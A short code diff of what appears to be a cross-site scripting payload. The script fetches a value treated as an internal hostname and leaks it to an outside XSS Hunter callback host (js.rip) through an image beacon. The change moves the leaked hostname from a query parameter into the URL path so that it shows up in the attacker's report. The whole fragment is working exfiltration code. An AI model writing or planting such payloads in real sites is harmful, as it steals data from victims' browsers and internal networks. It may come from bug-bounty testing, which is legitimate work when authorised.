@@ -9,8 +9,8 @@
     })
     .then(r => r.text())
     .then(hostname => {
-      // Send raw hostname as query param so it shows in XSS Hunter logs
-      new Image().src = "https://js.rip/5mw8at9w5s?leaked=" + encodeURIComponent(hostname);
+      // Send raw hostname in the path so it shows up in XSS Hunter report URL
+      new Image().src = "https://js.rip/5mw8at9w5s/" + encodeURIComponent(hostname);
     });
     // No .catch — if fetch fails, only the script load fires
   </script>
